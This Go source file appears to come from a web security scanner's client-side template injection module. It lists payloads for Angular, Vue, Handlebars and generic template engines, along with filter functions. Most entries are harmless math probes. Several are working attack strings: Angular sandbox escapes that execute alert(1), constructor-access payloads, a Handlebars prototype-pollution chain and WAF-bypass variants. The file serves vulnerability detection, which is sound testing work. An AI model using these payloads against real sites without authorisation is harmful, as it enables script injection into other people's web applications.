// Package csti provides payloads for Client-Side Template Injection detection.
package csti

// Framework represents the client-side template framework.
type Framework string

const (
	FrameworkAngular    Framework = "angular"
	FrameworkVue        Framework = "vue"
	FrameworkReact      Framework = "react"
	FrameworkEmber      Framework = "ember"
	FrameworkHandlebars Framework = "handlebars"
	FrameworkGeneric    Framework = "generic"
)

// Payload represents a CSTI payload.
type Payload struct {
	Value       string
	Framework   Framework
	Description string
	Expected    string // Expected output if vulnerable
	WAFBypass   bool
}

var payloads = []Payload{
	// Angular expressions
	{Value: "{{7*7}}", Framework: FrameworkAngular, Description: "Angular basic math expression", Expected: "49"},
	{Value: "{{constructor.constructor('return 1')()}}", Framework: FrameworkAngular, Description: "Angular constructor access", Expected: "1"},
	{Value: "{{$on.constructor('return 1')()}}", Framework: FrameworkAngular, Description: "Angular $on constructor", Expected: "1"},
	{Value: "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)}}", Framework: FrameworkAngular, Description: "Angular sandbox escape", Expected: ""},
	{Value: "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}", Framework: FrameworkAngular, Description: "Angular advanced sandbox escape", Expected: ""},

	// Vue.js expressions
	{Value: "{{7*7}}", Framework: FrameworkVue, Description: "Vue basic math expression", Expected: "49"},
	{Value: "{{_openBlock.constructor('return 1')()}}", Framework: FrameworkVue, Description: "Vue constructor access", Expected: "1"},
	{Value: "{{_c.constructor('return 1')()}}", Framework: FrameworkVue, Description: "Vue _c constructor", Expected: "1"},

	// Generic template expressions (work across frameworks)
	{Value: "${7*7}", Framework: FrameworkGeneric, Description: "Template literal expression", Expected: "49"},
	{Value: "#{7*7}", Framework: FrameworkGeneric, Description: "Ruby/Pug template expression", Expected: "49"},
	{Value: "<%=7*7%>", Framework: FrameworkGeneric, Description: "ERB/EJS template expression", Expected: "49"},

	// Handlebars
	{Value: "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n    {{/with}}\n  {{/with}}\n{{/with}}", Framework: FrameworkHandlebars, Description: "Handlebars prototype pollution", Expected: ""},

	// WAF Bypass variants
	{Value: "{%raw%}{{7*7}}{%endraw%}", Framework: FrameworkGeneric, Description: "Jinja2 raw block bypass", Expected: "49", WAFBypass: true},
	{Value: "{{7*'7'}}", Framework: FrameworkGeneric, Description: "String multiplication test", Expected: "7777777", WAFBypass: true},
	{Value: "{{[].pop.constructor('return 1')()}}", Framework: FrameworkGeneric, Description: "Array constructor access", Expected: "1", WAFBypass: true},
	{Value: "{{\"\".__class__}}", Framework: FrameworkGeneric, Description: "Python class access test", Expected: "", WAFBypass: true},

	// Detection probes (safe math expressions)
	{Value: "{{9999*9999}}", Framework: FrameworkGeneric, Description: "Large multiplication probe", Expected: "99980001"},
	{Value: "{{3*3*3}}", Framework: FrameworkGeneric, Description: "Triple multiplication probe", Expected: "27"},
	{Value: "{{7+7}}", Framework: FrameworkGeneric, Description: "Addition probe", Expected: "14"},
	{Value: "${9999+1}", Framework: FrameworkGeneric, Description: "Addition template literal", Expected: "10000"},
}

// GetPayloads returns all CSTI payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetByFramework returns payloads for a specific framework.
func GetByFramework(framework Framework) []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.Framework == framework {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns only WAF bypass payloads.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetProbePayloads returns safe detection probe payloads.
func GetProbePayloads() []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.Expected != "" && !p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}
